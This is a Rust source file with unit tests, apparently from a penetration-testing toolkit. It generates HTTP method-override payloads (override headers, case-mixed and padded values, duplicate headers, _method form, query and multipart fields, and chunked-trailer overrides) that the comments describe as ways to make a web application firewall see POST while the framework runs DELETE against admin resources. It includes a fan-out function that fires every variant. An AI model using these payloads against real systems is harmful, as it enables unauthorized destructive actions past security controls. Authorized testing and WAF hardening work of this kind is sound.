//! HTTP method-override confusion library.
//!
//! Web frameworks accept "method override" hints — extra ways for a
//! client behind a form (which only emits GET / POST) to request a
//! PUT / DELETE / PATCH / etc. The hint comes in via four channels:
//!
//! 1. **`X-HTTP-Method-Override` header** (Rails, Express, Django,
//!    Symfony, Spring, ASP.NET). Some frameworks also accept
//!    `X-HTTP-Method`, `X-Method-Override`.
//! 2. **`_method` form field** (Rails, Laravel — emitted by Rails
//!    `<%= form_with method: :delete %>` helpers).
//! 3. **`_method` query parameter** (Rails fallback when the request
//!    is a POST without a form-encoded body).
//! 4. **`HTTP_X_HTTP_METHOD_OVERRIDE` env var** (CGI bridges that
//!    pass headers as env vars; older PHP / Perl deployments).
//!
//! The WAF's threat model is usually based on the WIRE METHOD. If
//! the wire shows `POST /resource`, the WAF applies POST rules. But
//! the framework re-interprets the request as `DELETE /resource`
//! and the action runs. Attacker reaches an authenticated
//! `DELETE /admin/user/123` while the WAF saw `POST /admin/user/123`
//! and didn't fire its DELETE-against-admin rule.
//!
//! This library produces the WIRE BYTES for every override channel,
//! plus a few exotic variants:
//!
//! - **Case-variant override**: `X-HTTP-Method-Override: dElEtE`.
//!   Frameworks usually upper-case before dispatch; WAFs that
//!   blocklist `DELETE` literally miss.
//! - **Whitespace-padded override**: `X-HTTP-Method-Override:  \tDELETE`.
//! - **Duplicate override header**: two `X-HTTP-Method-Override`
//!   lines with different methods. RFC says concatenate with comma;
//!   frameworks split on comma and pick first / last differently.
//! - **Override-via-trailer**: HTTP/1.1 chunked-trailer with
//!   `X-HTTP-Method-Override`. Some frameworks read trailers; WAFs
//!   typically don't.
//! - **HTTP/2 `:method` smuggled via `X-HTTP-Method-Override`**:
//!   `POST` on the H2 pseudo-header + DELETE in the override
//!   custom header.
//! - **Form-field override with multipart**: `_method` in a multipart
//!   field that the WAF parses as a text field but the framework
//!   parses as a directive.
//!
//! Output contract: each function returns just the relevant header
//! line or form-field bytes. The operator composes them into a
//! complete request.

/// Build an `X-HTTP-Method-Override` header line that hints DELETE
/// (or any caller-supplied method) while the wire method is POST.
#[must_use]
pub fn override_header(method: &str) -> String {
    format!("X-HTTP-Method-Override: {method}")
}

/// Alternate header name: `X-HTTP-Method`. Used by some Rails
/// stacks and ASP.NET WebAPI.
#[must_use]
pub fn override_header_alt(method: &str) -> String {
    format!("X-HTTP-Method: {method}")
}

/// Another alternate: `X-Method-Override`. Used by Express
/// `method-override` middleware (default header name).
#[must_use]
pub fn override_header_express(method: &str) -> String {
    format!("X-Method-Override: {method}")
}

/// Case-mixed method value to defeat case-sensitive WAF blocklists.
#[must_use]
pub fn override_header_case_mix(method: &str) -> String {
    let mixed: String = method
        .chars()
        .enumerate()
        .map(|(i, c)| {
            if i % 2 == 0 {
                c.to_ascii_lowercase()
            } else {
                c.to_ascii_uppercase()
            }
        })
        .collect();
    format!("X-HTTP-Method-Override: {mixed}")
}

/// Whitespace-padded variant — WAF may strip leading whitespace
/// before logging but framework re-parses the value.
#[must_use]
pub fn override_header_padded(method: &str) -> String {
    format!("X-HTTP-Method-Override:  \t {method}  ")
}

/// Duplicate-header smuggle. Two header lines with different
/// method values — front-end and back-end disagree on which wins.
#[must_use]
pub fn override_header_duplicate(method_a: &str, method_b: &str) -> String {
    format!("X-HTTP-Method-Override: {method_a}\r\nX-HTTP-Method-Override: {method_b}")
}

/// Form-field `_method` override (urlencoded body). Used by Rails
/// and Laravel form helpers.
#[must_use]
pub fn form_field_method(method: &str) -> String {
    format!("_method={method}")
}

/// Query-string `_method` override (Rails accepts on POST requests
/// when there's no form body).
#[must_use]
pub fn query_method(method: &str) -> String {
    format!("?_method={method}")
}

/// Multipart `_method` field — sends as multipart/form-data so the
/// WAF that only inspects form-urlencoded misses it.
#[must_use]
pub fn multipart_method(method: &str, boundary: &str) -> String {
    format!(
        "--{boundary}\r\nContent-Disposition: form-data; name=\"_method\"\r\n\r\n{method}\r\n--{boundary}--\r\n"
    )
}

/// HTTP/1.1 chunked trailer override. The header block looks like
/// a plain POST; the framework reads the trailer after the chunked
/// body and finds DELETE.
#[must_use]
pub fn chunked_trailer_override(method: &str, body: &str) -> String {
    let body_len_hex = format!("{:x}", body.len());
    format!(
        "Transfer-Encoding: chunked\r\nTrailer: X-HTTP-Method-Override\r\n\r\n{body_len_hex}\r\n{body}\r\n0\r\nX-HTTP-Method-Override: {method}\r\n\r\n"
    )
}

/// Combine BOTH header AND form field with DIFFERENT methods.
/// Framework precedence varies: Rails uses form, Express depends
/// on configuration order. Catches every framework with one shot.
#[must_use]
pub fn header_plus_form_disagree(header_method: &str, form_method: &str) -> String {
    format!(
        "X-HTTP-Method-Override: {header_method}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n_method={form_method}"
    )
}

/// Build a one-shot fan-out: every override channel for the same
/// target method. Returns ~12 variants the operator can fire to
/// learn which channels the target honors.
#[must_use]
pub fn all_override_variants(method: &str) -> Vec<(&'static str, String)> {
    vec![
        ("header-standard", override_header(method)),
        ("header-alt", override_header_alt(method)),
        ("header-express", override_header_express(method)),
        ("header-case-mix", override_header_case_mix(method)),
        ("header-padded", override_header_padded(method)),
        ("header-duplicate", override_header_duplicate("GET", method)),
        ("form-field", form_field_method(method)),
        ("query", query_method(method)),
        (
            "multipart",
            multipart_method(method, "------WebKitFormBoundaryXXX"),
        ),
        (
            "chunked-trailer",
            chunked_trailer_override(method, "name=value"),
        ),
        ("header-plus-form", header_plus_form_disagree("GET", method)),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn override_header_basic_delete() {
        assert_eq!(override_header("DELETE"), "X-HTTP-Method-Override: DELETE");
    }

    #[test]
    fn override_header_alt_name() {
        assert_eq!(override_header_alt("PUT"), "X-HTTP-Method: PUT");
    }

    #[test]
    fn override_header_express_name() {
        assert_eq!(override_header_express("PATCH"), "X-Method-Override: PATCH");
    }

    #[test]
    fn override_header_case_mix_alternates() {
        let h = override_header_case_mix("DELETE");
        // Lower-Upper-Lower-Upper-Lower-Upper.
        assert!(h.contains("dElEtE"));
    }

    #[test]
    fn override_header_case_mix_short() {
        let h = override_header_case_mix("GET");
        assert!(h.contains("gEt"));
    }

    #[test]
    fn override_header_padded_has_whitespace() {
        let h = override_header_padded("DELETE");
        assert!(h.contains("\t"));
        assert!(h.contains("  ")); // double-space
        assert!(h.contains("DELETE"));
    }

    #[test]
    fn override_header_duplicate_emits_two_lines() {
        let h = override_header_duplicate("GET", "DELETE");
        assert_eq!(h.matches("X-HTTP-Method-Override:").count(), 2);
        assert!(h.contains("GET"));
        assert!(h.contains("DELETE"));
    }

    #[test]
    fn form_field_method_basic() {
        assert_eq!(form_field_method("DELETE"), "_method=DELETE");
    }

    #[test]
    fn query_method_has_question_mark() {
        let q = query_method("DELETE");
        assert_eq!(q, "?_method=DELETE");
        assert!(q.starts_with('?'));
    }

    #[test]
    fn multipart_method_contains_boundary_and_method() {
        let m = multipart_method("DELETE", "BOUND");
        assert!(m.contains("--BOUND"));
        assert!(m.contains("--BOUND--"));
        assert!(m.contains("name=\"_method\""));
        assert!(m.contains("DELETE"));
    }

    #[test]
    fn chunked_trailer_contains_trailer_header() {
        let c = chunked_trailer_override("DELETE", "key=val");
        assert!(c.contains("Transfer-Encoding: chunked"));
        assert!(c.contains("Trailer: X-HTTP-Method-Override"));
        assert!(c.contains("X-HTTP-Method-Override: DELETE"));
        // Chunked body has 0-terminator.
        assert!(c.contains("\r\n0\r\n"));
    }

    #[test]
    fn chunked_trailer_body_length_correct_hex() {
        let c = chunked_trailer_override("DELETE", "abc");
        // "abc" = 3 bytes = hex '3'.
        assert!(c.contains("3\r\nabc\r\n"));
    }

    #[test]
    fn chunked_trailer_body_length_two_digit_hex() {
        let c = chunked_trailer_override("DELETE", "0123456789ABCDEF0123"); // 20 bytes
        // 20 decimal = 14 hex.
        assert!(c.contains("14\r\n"));
    }

    #[test]
    fn header_plus_form_uses_both_channels() {
        let h = header_plus_form_disagree("GET", "DELETE");
        assert!(h.contains("X-HTTP-Method-Override: GET"));
        assert!(h.contains("_method=DELETE"));
    }

    #[test]
    fn all_override_variants_count() {
        let v = all_override_variants("DELETE");
        assert!(v.len() >= 10);
    }

    #[test]
    fn all_override_variants_unique_names() {
        let v = all_override_variants("DELETE");
        let names: std::collections::HashSet<&&str> = v.iter().map(|(n, _)| n).collect();
        assert_eq!(names.len(), v.len());
    }

    #[test]
    fn all_override_variants_contain_target_method() {
        // header-case-mix intentionally changes the ASCII case of the method
        // value (that IS its WAF-evasion purpose), so we compare case-insensitively.
        let v = all_override_variants("UNIQUEMARKER");
        let marker_lower = "uniquemarker";
        for (name, payload) in &v {
            assert!(
                payload.to_ascii_lowercase().contains(marker_lower),
                "{name} doesn't carry the method: {payload}"
            );
        }
    }

    #[test]
    fn deterministic_across_calls() {
        let a = all_override_variants("DELETE");
        let b = all_override_variants("DELETE");
        assert_eq!(a, b);
    }

    #[test]
    fn handles_unicode_method() {
        // RFC 7230 method tokens are tchar (ASCII only), but the
        // library doesn't enforce — frameworks vary.
        let h = override_header("DÉLÊTE");
        assert!(h.contains("DÉLÊTE"));
    }

    #[test]
    fn adversarial_long_method_no_panic() {
        let big = "X".repeat(10_000);
        let _ = override_header(&big);
        let _ = override_header_case_mix(&big);
        let _ = all_override_variants(&big);
    }

    #[test]
    fn override_header_empty_method() {
        let h = override_header("");
        assert_eq!(h, "X-HTTP-Method-Override: ");
    }

    #[test]
    fn case_mix_idempotent_on_alternation() {
        // Calling case-mix twice produces the same output (mixing
        // is deterministic, not random).
        let a = override_header_case_mix("HELLO");
        let b = override_header_case_mix("HELLO");
        assert_eq!(a, b);
    }

    #[test]
    fn duplicate_header_no_crlf_injection_outside_header_block() {
        // The CRLF separates two legitimate headers. There should
        // be exactly TWO CRLFs (one per header line ending), not
        // any embedded inside a value.
        let h = override_header_duplicate("A", "B");
        // Lines: "X-HTTP-Method-Override: A\r\nX-HTTP-Method-Override: B"
        // CRLF count = 1.
        assert_eq!(h.matches("\r\n").count(), 1);
    }

    #[test]
    fn case_mix_empty_string() {
        assert_eq!(override_header_case_mix(""), "X-HTTP-Method-Override: ");
    }

    #[test]
    fn multipart_handles_special_chars_in_method() {
        // We don't sanitize the method — operator's responsibility.
        let m = multipart_method("DELETE\r\nX-Inject: yes", "B");
        // The injection is in the value — caller must escape at
        // their layer. Test just confirms no panic.
        assert!(m.contains("name=\"_method\""));
    }

    #[test]
    fn chunked_trailer_empty_body() {
        let c = chunked_trailer_override("DELETE", "");
        // 0-length body still has terminating zero-chunk.
        assert!(c.contains("0\r\n"));
        assert!(c.contains("X-HTTP-Method-Override: DELETE"));
    }
}
